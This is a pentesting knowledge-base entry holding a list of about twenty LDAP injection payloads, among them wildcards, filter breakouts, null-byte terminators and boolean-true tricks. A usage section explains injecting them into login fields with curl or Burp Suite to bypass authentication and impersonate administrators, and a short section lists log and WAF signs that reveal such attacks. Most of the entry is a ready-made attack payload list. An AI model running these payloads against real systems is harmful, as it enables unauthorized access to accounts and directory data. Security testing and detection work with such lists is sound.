---
id: 51432d8e-4997-4fae-908c-5650aef47b9a
name: LDAP-Injection-Payloads-List
type: code
language: Text
verified: true
created_at: '2023-04-06T03:56:01.605147+00:00'
updated_at: '2023-04-10T20:36:28.416860+00:00'
platforms:
  - Web
tags:
  - ldap-injection
  - payloads
validated: true
---

# LDAP-Injection-Payloads-List

## Code

```text
*
*)(&
*))%00
)(cn=))\x00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
*/*
*|
/
//
*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
```

## Description

This is a collection of common LDAP injection payloads designed to test for vulnerabilities in applications using LDAP for authentication. Each payload targets different ways to break out of query strings, use wildcards for enumeration, or force boolean true conditions to bypass login checks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| N/A | These are static text payloads; substitute directly into input fields like username. No variables. | Use 'admin*' to match any admin with non-empty password. |

## Usage

Inject these payloads into vulnerable input fields (e.g., username in login forms) using tools like curl or Burp Suite. Start with simple ones like '*' to check for wildcard acceptance, then try complex ones like 'admin*)((|userpassword=*)' to impersonate admins. Monitor responses for successful logins or error changes indicating injection success. Use in ethical pentesting only.

## Detection

- LDAP server logs showing malformed queries with wildcards (*), operators (&, |, !), or null bytes (%00, \x00).
- Application logs with anomalous authentication successes or error patterns like "invalid syntax near )".
- WAF alerts for injection signatures in POST data.
- Network traffic analysis for repeated failed logins with patterned inputs.

## Related

- [[procedures/Perform-LDAP-Injection-for-Authentication-Bypass]]
- [[commands/curl-post-ldap-payload]]
